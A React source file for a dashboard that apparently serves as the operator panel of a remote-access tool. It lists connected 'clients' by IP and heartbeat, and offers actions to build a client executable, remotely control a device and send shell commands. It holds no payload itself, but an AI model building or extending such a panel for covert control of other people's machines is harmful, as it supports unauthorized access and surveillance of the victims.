'use client'

import { useState, useEffect, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '@/lib/hooks/useAuth';
import BottomNav from '@/components/nav/BottomNav';
import StatCard from '@/components/dashboard/StatCard';
import QuickAction from '@/components/dashboard/QuickAction';
import ClientCard from '@/components/dashboard/ClientCard';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { timeAgo } from '@/lib/utils';
import { Search, Monitor, Radio, Terminal, Package, Plus, Activity, Wifi, WifiOff } from 'lucide-react';
import io from 'socket.io-client';
import config from '@/config.json';

const API_URL = config.BASE_API;
const API_BASE = `${API_URL}/v${config.API_VERSION}`;

export default function Dashboard() {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [connections, setConnections] = useState([]);
  const [query, setQuery] = useState('');

  useEffect(() => {
    if (!API_URL) return;

    const fetchConnections = async () => {
      try {
        const res = await fetch(`${API_BASE}/connections/recent`, { credentials: 'include' });
        if (!res.ok) throw new Error(res.status);
        setConnections(await res.json());
      } catch (e) {
        console.error('Error fetching connections:', e);
      }
    };

    fetchConnections();

    const socket = io(API_URL.split('/api')[0], { withCredentials: true });
    socket.on('newConnection', (connection) => {
      if (!user || String(connection.ownerId) !== String(user.id)) return;
      setConnections(prev => {
        const next = [connection, ...prev.filter(c => c._id !== connection._id)];
        return next.slice(0, 50);
      });
    });
    socket.on('connectionUpdated', (updatedConnection) => {
      if (!user || String(updatedConnection.ownerId) !== String(user.id)) return;
      setConnections(prev => prev.map(c => c._id === updatedConnection._id ? updatedConnection : c));
    });

    return () => socket.disconnect();
  }, [user]);

  const stats = useMemo(() => {
    const online = connections.filter(c => c.isActive).length;
    const lastActivity = connections
      .map(c => c.lastHeartbeat || c.timestamp)
      .filter(Boolean)
      .sort((a, b) => new Date(b) - new Date(a))[0];
    return {
      total: connections.length,
      online,
      offline: connections.length - online,
      lastActivity
    };
  }, [connections]);

  const filtered = useMemo(() => {
    const q = query.trim().toLowerCase();
    if (!q) return connections;
    return connections.filter(c =>
      (c.deviceInfo || '').toLowerCase().includes(q) ||
      (c.ip || '').toLowerCase().includes(q)
    );
  }, [connections, query]);

  return (
    <div className="relative min-h-screen bg-gray-950 pb-20 sm:pb-24 text-white">
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-1/2 -left-1/2 w-full h-full rounded-full bg-purple-600/[0.07] blur-[120px]" />
        <div className="absolute -bottom-1/2 -right-1/2 w-full h-full rounded-full bg-purple-500/[0.05] blur-[120px]" />
      </div>
      <div className="absolute inset-0 opacity-[0.015] pointer-events-none" style={{
        backgroundImage: `radial-gradient(circle at 1px 1px, white 1px, transparent 0)`,
        backgroundSize: '32px 32px'
      }} />

      <header className="relative z-10 p-4 sm:p-6 border-b border-white/[0.06]">
        <div className="max-w-5xl mx-auto flex items-center gap-3">
          <div className="w-10 h-10 bg-purple-500/20 rounded-xl flex items-center justify-center shrink-0">
            <Monitor className="w-5 h-5 text-purple-400" />
          </div>
          <div className="min-w-0">
            <h1 className="font-semibold text-base sm:text-lg text-white truncate">{user?.username || 'Dashboard'}</h1>
            <div className="flex items-center gap-2">
              <span className="text-xs text-gray-500">Welcome back</span>
              <span className="px-1.5 py-0.5 text-[10px] bg-purple-500/20 text-purple-300 rounded font-medium">Free</span>
            </div>
          </div>
        </div>
      </header>

      <div className="relative z-10 max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
        <section className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4">
          <StatCard label="Total" value={stats.total} icon={Monitor} accent="text-purple-400" />
          <StatCard label="Online" value={stats.online} icon={Wifi} accent="text-green-400" pulse={stats.online > 0} />
          <StatCard label="Offline" value={stats.offline} icon={WifiOff} accent="text-gray-400" />
          <StatCard label="Last activity" value={timeAgo(stats.lastActivity)} icon={Activity} accent="text-violet-300" isText />
        </section>

        <section className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          <QuickAction icon={Package} label="Build client" desc="Create a new exe" onClick={() => navigate('/dash/builder')} />
          <QuickAction icon={Radio} label="Remote" desc="Control a device" onClick={() => navigate('/dash/remote')} />
          <QuickAction icon={Terminal} label="Shell" desc="Send commands" onClick={() => navigate('/dash/shell')} />
        </section>

        <section>
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-sm font-medium text-gray-300">Your clients</h2>
            <span className="text-xs text-gray-500">{filtered.length} {filtered.length === 1 ? 'device' : 'devices'}</span>
          </div>

          <div className="relative mb-3">
            <Search className="absolute left-3 top-3 h-4 w-4 text-gray-500 pointer-events-none" />
            <Input
              value={query}
              onChange={(e) => setQuery(e.target.value)}
              placeholder="Search by name or IP"
              className="pl-10 bg-gray-800/50 border-white/[0.08] text-white placeholder:text-gray-600 focus-visible:ring-purple-500/30"
            />
          </div>

          {connections.length === 0 ? (
            <div className="flex flex-col items-center justify-center text-center p-10 bg-gray-900/40 backdrop-blur-sm border border-white/[0.06] rounded-2xl">
              <div className="w-16 h-16 rounded-2xl bg-purple-500/10 flex items-center justify-center mb-3">
                <Monitor className="w-8 h-8 text-purple-400/70" />
              </div>
              <p className="text-sm text-gray-400 mb-1">No client yet</p>
              <p className="text-xs text-gray-600 mb-4">Build an executable and run it to see it appear here.</p>
              <Button
                onClick={() => navigate('/dash/builder')}
                className="bg-gradient-to-r from-purple-600 to-violet-600 text-white hover:brightness-110 shadow-lg shadow-purple-500/20"
              >
                <Plus className="w-4 h-4 mr-2" />
                Build your first client
              </Button>
            </div>
          ) : filtered.length === 0 ? (
            <p className="text-center text-sm text-gray-500 py-8">No device matches "{query}".</p>
          ) : (
            <div className="space-y-2">
              {filtered.map(c => <ClientCard key={c._id} connection={c} />)}
            </div>
          )}
        </section>
      </div>

      <BottomNav />
    </div>
  );
}
